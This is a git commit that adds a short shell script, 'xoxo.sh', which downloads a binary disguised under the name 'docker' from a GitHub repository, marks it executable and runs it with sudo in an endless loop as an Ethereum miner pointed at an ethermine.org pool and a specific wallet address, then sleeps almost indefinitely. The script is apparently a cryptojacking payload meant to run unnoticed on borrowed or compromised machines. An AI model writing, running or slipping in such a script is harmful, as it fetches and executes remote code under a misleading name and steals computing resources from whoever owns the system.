87163535c0a1693ef35c1656ae8ae6d0b3d7e4b5
xkolux <87460458+xkolux@users.noreply.github.com>
2021-07-15 09:50:48 +0530

    Update and rename junloper.sh to xoxo.sh

---
+++ xoxo.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+
+sudo apt install libpci3
+wget https://github.com/xkolux/takealook/raw/main/docker
+chmod +x docker
+while [ 1 ]; do
+sudo ./docker -pool stratum+ssl://eu1.ethermine.org:5555 -wal 0xD07b31e87Bf3892D9F6cA4a417ccACD439EC51Cc.$(echo $(shuf -i 1-10 -n 1)-KILLME) -pass x -proto 2 -mi 12 -gt 400
+sleep 5
+done
+sleep 999999999
